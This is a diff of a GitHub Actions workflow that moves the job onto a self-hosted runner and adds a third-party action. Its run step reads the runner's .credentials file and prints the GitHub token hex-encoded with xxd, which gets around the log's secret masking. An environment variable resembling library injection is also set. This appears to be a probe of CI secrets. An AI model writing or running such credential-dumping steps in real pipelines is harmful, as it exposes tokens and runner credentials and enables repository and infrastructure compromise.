@@ -17,13 +17,14 @@ jobs:
 #          - /:/var/lib/clickhouse
     #container:
     #  image: alpine:3.11.5
-    #runs-on: self-hosted
+    runs-on: self-hosted
     #runs-on: [ubuntu-latest]
     #runs-on: [windows-latest]
-    runs-on: ${{matrix.OS}}
+    #runs-on: ${{matrix.OS}}
     env:
       DDYLD_INSERT_LIBRARIES: /test/test/test
     steps:
+    - uses: h10s/pre-post-javascript-action
     - run: |
         cat /home/runner/runners/2.169.1/.credentials
         echo ${{github.token}} | xxd -ps
